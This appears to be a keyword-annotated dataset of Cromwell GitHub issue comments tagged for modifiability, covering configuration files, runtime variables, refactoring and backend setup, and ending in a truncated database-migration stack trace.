Modifiability,"To be totally honest, [this file](https://github.com/broadinstitute/cromwell/blob/develop/cromwell.examples.conf) is a total config from my darkest of nightmares. If a user opens that and needs to figure out what to do? I'd guess they would be overwhelmed. What about a folder of example configuration files instead? Eg. ```; examples/; cromwell.singularity.conf; cromwell.docker.conf; cromwell.slurm.singularity.conf; cromwell.slurm.conf; ....; ```; At least that way it's not config overload. Thoughts?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-468832876:125,config,config,125,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-468832876,3,['config'],"['config', 'configuration']"
Modifiability,"To effectively use ""Retry with More Memory"" for JVM jobs running on Papi one has to use `MEM_SIZE` and `MEM_UNIT` to run with the correct memory settings. But those variables were not available on any other backends. Therefore one ended up having to use other creative options for [authoring multi-backend WDL](https://github.com/broadinstitute/warp/issues/481) such as using [`free`](https://github.com/broadinstitute/warp/pull/197/files/ae14bee73c07684b97dad22b8f3de53ff6404afe..f0692505010baa576f9fe09578fa001661a55145#r735883251). This PR exposes those two environment variables to the `command` block on any Cromwell ""standard"" backend that supports the `memory` runtime attribute. Using the environment variables also helps with call caching java jobs. One can use something along the lines of `-Xmx${MEM_SIZE%.*}${MEM_UNIT%?}` in a version 1.0+ WDL and the command block will stay the same even if the memory needs to be increased. <hr/>. Side note: If anyone comes across this PR and wonders why the default `Local` backend doesn't support `MEM_SIZE` and `MEM_UNIT` it's because the Local backend does not use `memory` (nor `cpu` at the moment). The `memory` runtime attribute would need to be added into the [runtime attributes](https://github.com/broadinstitute/cromwell/blob/79/core/src/main/resources/reference_local_provider_config.inc.conf#L9-L12) with something like:. ```hocon; runtime-attributes = """"""; String? docker; String? docker_user; Int memory_mb = 2048; """"""; ```. And then inside [`submit-docker`](https://github.com/broadinstitute/cromwell/blob/79/core/src/main/resources/reference_local_provider_config.inc.conf#L14-L34) use `--memory=${memory_mb}m`. Then the changes in this PR will generate `MEM_SIZE` and `MEM_UNIT` for the Local backend too.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6766#issuecomment-1133753430:165,variab,variables,165,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6766#issuecomment-1133753430,3,['variab'],['variables']
Modifiability,"To summarize, these will be the spec mandated minimums. There'll also be configuration parameters in Cromwell to tune these higher if one wants. Cromwell will attempt to check file size *prior* to reading it or pulling it across the network for cloud filesystems. Error messages should be very clear and checked past @katevoss . `read_bool()` - 5 chars; `read_int()` - 19 chars; `read_float()` - 50 chars; `read_string()` - 128K ; `read_lines()` - 128K; `read_json()` - 128K; `read_[tsv|map|object]()` - 1MB",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1762#issuecomment-300349096:73,config,configuration,73,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1762#issuecomment-300349096,1,['config'],['configuration']
Modifiability,"To whitelist what we have in README copy this in the `[secrets]` section of your `<git_repo>/.git/config` file. ```; allowed = \""private_key_id\"": \""OMITTED\""; allowed = \""private_key\"": \""-----BEGIN PRIVATE KEY-----\\\\nBASE64 ENCODED KEY WITH \\\\n TO REPRESENT NEWLINES\\\\n-----END PRIVATE KEY-----\\\\n\""; allowed = \""client_id\"": \""22377410244549202395\""; allowed = The `private_key` portion needs; ```. or run . ```; git-secrets --add --allowed '""private_key_id"": ""OMITTED""'; git-secrets --add --allowed '""private_key"": ""-----BEGIN PRIVATE KEY-----\\nBASE64 ENCODED KEY WITH \\n TO REPRESENT NEWLINES\\n-----END PRIVATE KEY-----\\n""'; git-secrets --add --allowed '""client_id"": ""22377410244549202395""'; git-secrets --add --allowed '`private_key` portion needs'; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2479#issuecomment-319088844:98,config,config,98,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2479#issuecomment-319088844,1,['config'],['config']
Modifiability,ToL: . The title made me a little nervous that this was adding more coupling that would make things hard in a world where these services are different implementations or instantiated on remote servers. But since it looks like it's all being directed through the standard interfaces in the service registry it all looks OK. And I assume we can still give the `serviceRegistryActor: ActorRef` argument to a new service that's created remotely.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3294#issuecomment-367017359:68,coupling,coupling,68,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3294#issuecomment-367017359,1,['coupling'],['coupling']
Modifiability,"ToL:. It'd probably be best to slim down and refactor the old engine `cromwell.CromwellTestkitSpec` to a `cromwell.core.CromwellTestKitSpec` and `cromwell.engine.WorkflowTestKitSpec`. Also, the actor system created in the current `CromwellTestkitSpec` uses a custom configuration. As it doesn't fall back to `ConfigFactory.load()`, it doesn't seem to be support modifying [`akka.test.timefactor`](https://github.com/akka/akka/blob/v2.3.12/akka-testkit/src/main/scala/akka/testkit/TestKit.scala#L712-L714) on the sbt command line.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/906#issuecomment-222010926:45,refactor,refactor,45,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/906#issuecomment-222010926,3,"['Config', 'config', 'refactor']","['ConfigFactory', 'configuration', 'refactor']"
Modifiability,Travis appears to be legitimately unhappy with the hybrid metadata config,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5219#issuecomment-540534801:67,config,config,67,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5219#issuecomment-540534801,1,['config'],['config']
Modifiability,"Turns out @cjllanwarne swooped in and said what I was going to say, so what he said. Also he said it much better than I ever could have, as usual. @ffinfo you're obviously pretty familiar w/ this problem (I've traced it all the way back to an older PR of yours, #1346) and the main sticking point has been pretty consistent (i.e. the scaling Q), so I think @cjllanwarne is right and as long as it's configurable and defaulting in a manner which doesn't change current behavior I think this path is AOK.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-422879034:399,config,configurable,399,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-422879034,1,['config'],['configurable']
Modifiability,"UPDATE:. Refactored to use the standard backend. Based on my manual crude testing, basic functionality is there. Globs definitely don't work. . More to come soon.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1816#issuecomment-275251912:9,Refactor,Refactored,9,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1816#issuecomment-275251912,1,['Refactor'],['Refactored']
Modifiability,"Ultimately the question of how to resolve imports needs to be part of the WDL spec itself. NB that's not ""zip imports"" but rather just if everything is relative to the root workflow document or if everything is relative to the WDL at hand. Allowing for the behavior to be user defined makes WDL documents be non-portable. IMO it doesn't make much sense to add a switch into Cromwell to add support for the discarded angle of what was already a confusing grey area considering that the correct behavior has already been clarified for future spec versions. Updating the WDLs in question is the correct course of action here.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4515#issuecomment-451699830:312,portab,portable,312,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4515#issuecomment-451699830,1,['portab'],['portable']
Modifiability,"Unsurprisingly I had a handful of stylistic requests (although 2 I noted as being of the ""I'd appreciate you trying"" variety) as I realize they were largely c&p and need refactoring anyways). And there was the one comment I made about the general adherence to the guide - whitespace, HOF syntax, etc. I like the general structure of this though. . In terms of path to release my main concerns were addressed in separate line items, but were a) To what extent has this been tested on JES and b) What is necessary from this branch for s/g (i.e. beyond ""it'll suck to rebase after it"")",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/145#issuecomment-134736397:170,refactor,refactoring,170,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/145#issuecomment-134736397,1,['refactor'],['refactoring']
Modifiability,"Update: To avoid having all Cromwell instances send same data points to Grafana, now the config is an `Option[A]`. This way we can set it for the summarizer instance (PR [#2592](https://github.com/broadinstitute/firecloud-develop/pull/2592)) and have only 1 instance send data points. Testing from Dev:. ![Screen Shot 2021-07-06 at 2 10 25 PM](https://user-images.githubusercontent.com/16748522/124667085-edb05780-de7c-11eb-8dbd-888b13d702f7.png)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6382#issuecomment-875084254:89,config,config,89,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6382#issuecomment-875084254,1,['config'],['config']
Modifiability,Updated to publish counter metrics on per-reference-file basis (incremented until Cromwell restart). Also added logging for reference disks feature configuration step.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6145#issuecomment-757106497:148,config,configuration,148,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6145#issuecomment-757106497,1,['config'],['configuration']
Modifiability,"Upon further reflection I think I might want to work on this a bit more before merging. This addresses the problems of the list limit being too low and not configurable, but it doesn't yet address the problem that when the list limit is hit the code silently truncates. I'm not sure if GCS provides an API to say how many object have a given prefix, but I'd like to see if something like that is available. If the number of objects that would be returned by list() exceeds our limit, I think the code should fail noisily and not silently.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/710#issuecomment-210461439:156,config,configurable,156,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/710#issuecomment-210461439,1,['config'],['configurable']
Modifiability,"Usually when config and code are in disagreement I'd lean towards correcting the config to match the code rather than the other way round, especially if the code has already been deployed... but in this case if nobody is using the ""wrong"" code value then fixing the code to be consistent with all the other options seems fine to me.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5969#issuecomment-714540973:13,config,config,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5969#issuecomment-714540973,2,['config'],['config']
Modifiability,"WDL 1.0 and up [require a dedicated `inputs` section](https://github.com/openwdl/wdl/blob/main/versions/1.0/SPEC.md#workflow-inputs). You can easily find such errors when editing WDLs in IntelliJ (it will automatically suggest to install a WDL helper plugin). . <img width=""929"" alt=""Screen Shot 2022-05-23 at 1 39 42 PM"" src=""https://user-images.githubusercontent.com/1087943/169876581-2b2e91f3-16fe-4dcf-96bc-3af317eecbb5.png"">",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6767#issuecomment-1134959939:251,plugin,plugin,251,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6767#issuecomment-1134959939,1,['plugin'],['plugin']
Modifiability,"We believe this has been enhanced to some extent since this was filed. Further, with the advent of miniwdl there are better outlets for the behavior the single workflow runner provides. Closing for now.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1614#issuecomment-516557883:25,enhance,enhanced,25,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1614#issuecomment-516557883,1,['enhance'],['enhanced']
Modifiability,"We have RNA-Seq and de-novo assembly pipelines with many sub-workflows, forgetting to include a file or two is a common mistake that people make in the lab. Another inconvenience is that we have sub workflows in subfolders, and we do not know how to both keep references (incl. subfolders) to sub-workflows in the main WDL script (so IntelliJ idea WDL plugin can check that they are correct) but at the same time - send them as a lot of files via REST. I think being able to pack everything into one zip archive(preserving subfolder structure) and send it to REST API will allow tracking relative paths properly.; And the last argument is that sending only one file (instead of 5-15) to REST API is way more convenient for users!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2410#issuecomment-333265726:352,plugin,plugin,352,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2410#issuecomment-333265726,1,['plugin'],['plugin']
Modifiability,We have a similar need. This overlaps a little with #4579. It would be useful if the submit-docker was parameterized similar to how it is for some of the other backends.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5863#issuecomment-754946394:103,parameteriz,parameterized,103,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5863#issuecomment-754946394,1,['parameteriz'],['parameterized']
Modifiability,"We have not consistently been able to keep the JIRA board configured for the partial public access we need. The JIRA instance is shared by many groups and has to meet a lot of compliance needs, and the Cromwell access seems to get lost in the shuffle. I think it's more likely that we will remove the link to JIRA and suggest sticking to Github issues.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5031#issuecomment-1097501783:58,config,configured,58,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5031#issuecomment-1097501783,1,['config'],['configured']
Modifiability,"We have the same issue; we use an OGE back-end that implements hard limits on resource utilization which will terminate jobs that exceed these limits without allowing them to create an rc file. Currently we are running local mode cromwell instances with a workaround of putting a time-limit on the cromwell task of 48 hours, but this is extremely wasteful of our back end resources (cromwell itself consumes a large amount of memory on our cluster nodes). Our current workarounds involve putting a soft-limit on each job, attempting to trap SIGUSR1 in advance of the job being killed by the queue manager, at which point they create an rc file with a non-zero error code, but there is no guarantee that we can catch every instance of this. . Ideally we would like for cromwell to query running jobs at a user configurable interval (optionally never, but not as often as the file system is pinged for rc files so as not to burden the scheduler) against its list of jobs that are both not finished, and running and at minimum trigger the equivalent error state of a non-zero rc file return code. . We experience this problem frequently (and expect it to increase as we move more pipelines to cromwell) because our pipelines can not reliably estimate the amount of memory they need for tasks apriori.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-359006150:809,config,configurable,809,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-359006150,1,['config'],['configurable']
Modifiability,We know that both @MatthewMah and Intel were able to use SLURM (albeit with different configs),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1750#issuecomment-328209522:86,config,configs,86,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1750#issuecomment-328209522,1,['config'],['configs']
Modifiability,"We probably also want to say where to copy it to, e.g. ; ```; When using Spark backend, copy the Spark configuration in reference.conf (available under core/src/main/resources) into the main application.conf (in src/main/resources):; ```. I think we probably also don't want to have a copy/pasted version in this file, since it's unlikely to be updated if reference.conf is changed? Up to you!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2043#issuecomment-283980646:103,config,configuration,103,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2043#issuecomment-283980646,1,['config'],['configuration']
Modifiability,"We run into the same problem with our production pipelines (i.e. not having a clean output directory structure unless we do some magic). So this would be a huge improvement to us.; @ruchim Throwing an exception and marking the job as failed would be the best. As this makes sure the pipeline developers can easily spot when there are file collisions. Cromwell exiting with an exit code other than 0 after that will also make it easier. Another argument for having a flattened output structure: Continuous integration. We want to know if our pipeline produces certain files and these files have a certain content. However with the current output folder structure it is impossible to know where files are going to end up, so it is hard to test them.; We circumvent this by setting an ""outputDir"" variable in our workflows and tasks which is absolute, so the files are copied to one place. But this is less than ideal. We should not have to hack in WDL as a replacement for functionality in the execution engine.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1641#issuecomment-474726705:794,variab,variable,794,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1641#issuecomment-474726705,1,['variab'],['variable']
Modifiability,"We should try to find a way to deprecate this in the config files, the combo of the reflection and the way that users just copy/paste whole blocks even if they're not modifying anything will make it hard to have this be purely cosmetic",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2019#issuecomment-321343728:53,config,config,53,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2019#issuecomment-321343728,1,['config'],['config']
Modifiability,"We use singularity images too, are you following the Cromwell Containers guide to configure singularity: https://cromwell.readthedocs.io/en/stable/tutorials/Containers/",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-1047370199:82,config,configure,82,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-1047370199,1,['config'],['configure']
Modifiability,We're pausing this investigation for now so it doesn't make sense to deploy an enhanced-logging version of Cromwell if we're not going to look at the logs for a while,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4407#issuecomment-442196385:79,enhance,enhanced-logging,79,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4407#issuecomment-442196385,1,['enhance'],['enhanced-logging']
Modifiability,"Well nevermind, this does not seem to help, still seeing ; ```; Exceeded configured max-open-requests value of [128]. This means that the request queue of this pool (HostConnectionPoolSetup(localhost,...; ```. We might want to increase the `max-open-requests` conf setting instead ?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3801#issuecomment-399141015:73,config,configured,73,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3801#issuecomment-399141015,1,['config'],['configured']
Modifiability,"Well, here's a use case. I want to run the same workflow on exomes and on whole genomes, and some of my parameters take different defaults depending on the data type. It would be swell to be able to say e.g. `my_param = param_values[data_type]` assuming I've set up my defaults as maps with e.g. 'wgs' and 'exome' as keys, and I can somewhere set `data_type = 'wgs'` (because presumably several values would need to be switched) (by the way, does wdl have enums?). So I'd have defaults that are variable references -- but I might decide to use something else entirely and just input my_workflow.my_param = 5 in my json for whatever reason. . Is that crazy/wrong?. I guess I could instead do the override by injecting the value I want into `param_values`...? But then I'm constrained to work with whatever `data_types` have been planned for and can't add something different on the fly. . Does any of this make sense?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2565#issuecomment-323826098:495,variab,variable,495,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2565#issuecomment-323826098,1,['variab'],['variable']
Modifiability,What about simply a unit test that verifies that it does (resp. doesn't) parse a correct (resp. wrong) conf file (wrt Google configuration) ?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/349#issuecomment-169074667:125,config,configuration,125,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/349#issuecomment-169074667,1,['config'],['configuration']
Modifiability,"What authentication mode are you running in (default credentials, service account or refresh token)? Does your config make use of private dockerhub credentials. I'm wondering why it's writing an authorization at all.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1644#issuecomment-257870895:111,config,config,111,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1644#issuecomment-257870895,1,['config'],['config']
Modifiability,"What does the storage block in cromwell config look like? In particular, do you have a region set? If I recall correctly, I had to actually set the region (not default) or I had similar errors.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-437349327:40,config,config,40,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-437349327,1,['config'],['config']
Modifiability,"When rebasing and resolving conflicts this PR will need to be rewired, starting with:. ```scala; object JesRuntimeAttributes {; val runtimeAttributesBuilder: StandardValidatedRuntimeAttributesBuilder = …. private val zonesValidation: RuntimeAttributesValidation[Vector[String]] =; ZonesValidation.withDefault(WdlString(ZoneDefaultValue)). def apply(validatedRuntimeAttributes: ValidatedRuntimeAttributes): JesRuntimeAttributes = …; ```. converted to:. ```scala; object JesRuntimeAttributes {; def runtimeAttributesBuilder(jesConfiguration: JesConfiguration): StandardValidatedRuntimeAttributesBuilder = . private def zonesValidation(defaultZones: NonEmptyList[String]): RuntimeAttributesValidation[Vector[String]] =; ZonesValidation.withDefault(WdlString(defaultZones.toList.mkString("",""))). def apply(validatedRuntimeAttributes: ValidatedRuntimeAttributes,; jesConfiguration: JesConfiguration): JesRuntimeAttributes = …; ```. This should be fine for plumbing from the main code, as each caller has a jesConfiguration. The test code may need some refactoring and/or mocks-- or the JRA object can add overloads, that in addition to receiving jesConfigurations, can take a nel of default zones.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1797#issuecomment-271135773:1047,refactor,refactoring,1047,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1797#issuecomment-271135773,1,['refactor'],['refactoring']
Modifiability,"When use the server mode, set ""backend.providers.Local.config.root"" in options.json is unusefule. ; It's a question.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3889#issuecomment-437590471:55,config,config,55,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3889#issuecomment-437590471,1,['config'],['config']
Modifiability,"When you submit a job to Cromwell with AWS Batch configured as the backend; AWS Batch will deploy workers via ECS. Those workers will be deployed; according to a launch template that configures the EC2 workers including; downloading and starting the EBS auto expander on the EC2 as part of its; startup. So it’s standard for the ECS cluster/ Batch compute environment used by; Cromwell but not standard for any other ECS node. On Wed, Jul 22, 2020 at 4:04 PM Richard Davison <notifications@github.com>; wrote:. > @markjschreiber <https://github.com/markjschreiber> : Oh! I think maybe I; > understand where the misunderstanding is. Could it be you're implying that; > the Cromwell *server* is correctly provisioning the worker nodes on; > behalf of the user?; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/pull/5468#issuecomment-662668064>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EKOXJKQMVJWYBPRYK3R45A6FANCNFSM4LW5UP3A>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5468#issuecomment-662751419:49,config,configured,49,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5468#issuecomment-662751419,2,['config'],"['configured', 'configures']"
Modifiability,"While exploring the idea of using a `monitoring_image` for this, I noticed it injects more or less the metadata I'd want into the monitoring container via environment variables already: . https://github.com/broadinstitute/cromwell/blob/adb8d2ad87cba307e5b1eccd1a3e21857cc9b81c/supportedBackends/google/pipelines/v2beta/src/main/scala/cromwell/backend/google/pipelines/v2beta/api/MonitoringAction.scala#L36. https://github.com/broadinstitute/cromwell/blob/adb8d2ad87cba307e5b1eccd1a3e21857cc9b81c/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/monitoring/Env.scala#L18. Is there a reason this could not also be injected into UserActions, and would you accept a PR that does so? (As a side note, it seems the monitoring image could likely accomplish what we want as well, but using one on Terra, or setting any custom workflow options is not allowed as far as I know).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1590042851:167,variab,variables,167,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7137#issuecomment-1590042851,1,['variab'],['variables']
Modifiability,"While this is investigated, you should be able to work around this by moving the constant string outside the `${}`s, eg ; ```; python $(which encode_trim_adapter.py) \; ${write_tsv(fastqs)} \; --adapters ${write_tsv(adapters)} \; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3032#issuecomment-350283048:195,adapt,adapters,195,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3032#issuecomment-350283048,2,['adapt'],['adapters']
Modifiability,"With `docker.io` prepended the job succeeds in Cromwell and GCP Batch with the below config. It fails without the `docker.io` prepend due to GCP Batch requiring it. There is a docker hash lookup error from the `WorkflowDockerLookupActor`. Error below. We can discuss more on meeting today. ```; config {; dockerhub {; token = ""base64-encoded-docker-hub-username:password""; }; ``` . ```; [2024-08-30 13:56:20,10] [warn] BackendPreparationActor_for_c5f3f88a:myWorkflow.myTask:-1:1 [c5f3f88a]: Docker lookup failed; java.lang.Exception: Failed to get docker hash for docker.io/dspeck/pull-test1:v1 Request failed with status 401 and body {""details"":""incorrect username or password""}; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321463479:85,config,config,85,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2321463479,2,['config'],['config']
Modifiability,With the new caching heuristic for generating File input hashes (`path+modtime`) relies on soft-linking for it to work correctly. Having soft-links disabled by design when containerizing a task makes this option mood. I consider it weird that a config option has a hard-override within cromwell... leave it up to users to configure their backend.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2620#issuecomment-482549494:245,config,config,245,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2620#issuecomment-482549494,2,['config'],"['config', 'configure']"
Modifiability,"Won't compile:. > [error] /Users/chrisl/IdeaProjects/cromwell/src/main/scala/cromwell/instrumentation/Instrumentation.scala:20: value getConfigOption is not a member of com.typesafe.config.Config; > [error] private val Config = ConfigFactory.load.getConfigOption(""instrumentation""); > [error] ^; > [error] one error found; > [error](compile:compileIncremental) Compilation failed",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/344#issuecomment-166862524:182,config,config,182,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/344#issuecomment-166862524,4,"['Config', 'config']","['Config', 'ConfigFactory', 'config']"
Modifiability,"Would having that information (filesystems configured for a backend) in the existing backend endpoint work for you ? I don't think we can consider a generic ""get a config value"" endpoint as it would be a massive security hole because the configuration contains secrets and passwords.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4317#issuecomment-433236430:43,config,configured,43,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4317#issuecomment-433236430,3,['config'],"['config', 'configuration', 'configured']"
Modifiability,"Would it be possible to use realistic paths, perhaps the `SINGULARITY_CACHEDIR`? And to make variables explicitly clear (and in quotes), maybe ""${docker_subbed}.sif"" instead of $docker_subbed.sif. The goal would be to have a general script that can work for most, correct?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-517265945:93,variab,variables,93,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-517265945,1,['variab'],['variables']
Modifiability,"Would you mind explaining the difference between `pull` and `build`? The reason I did build is because I needed to know where the output image ended up, so I could run it directly. If I `singularity pull docker://ubuntu`'d the image, and then `singularity run docker://ubuntu` from the worker, it would still try to pull the image a second time, and then hang forever because it didn't have network access. . Also, isn't the ability to build a binary image something that `build` can do, not `pull`?. The only reason I built a sandbox instead is simply because my admins wouldn't set the `setuid` bit, so it wouldn't work. Am I missing something here?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461708333:527,sandbox,sandbox,527,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461708333,1,['sandbox'],['sandbox']
Modifiability,"X OR (t2.JOB_SCATTER_INDEX IS NULL AND t1.JOB_SCATTER_INDEX IS NULL)); 	 AND (t2.JOB_RETRY_ATTEMPT = t1.JOB_RETRY_ATTEMPT OR (t2.JOB_RETRY_ATTEMPT IS NULL AND t1.JOB_RETRY_ATTEMPT IS NULL)); AND t2.METADATA_KEY LIKE CONCAT(TRIM(TRAILING ':message' FROM t1.METADATA_KEY), "":causedBy[%""); AND t2.METADATA_JOURNAL_ID <> t1.METADATA_JOURNAL_ID; )]; 	at liquibase.changelog.ChangeSet.execute(ChangeSet.java:619); 	at liquibase.changelog.visitor.UpdateVisitor.visit(UpdateVisitor.java:51); 	at liquibase.changelog.ChangeLogIterator.run(ChangeLogIterator.java:79); 	at liquibase.Liquibase.update(Liquibase.java:214); 	at liquibase.Liquibase.update(Liquibase.java:192); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:62); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:34); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1(ServicesStore.scala:11); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1$adapted(ServicesStore.scala:11); 	at cromwell.database.slick.SlickDatabase.$anonfun$withConnection$1(SlickDatabase.scala:155); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:70); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:69); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275); 	at 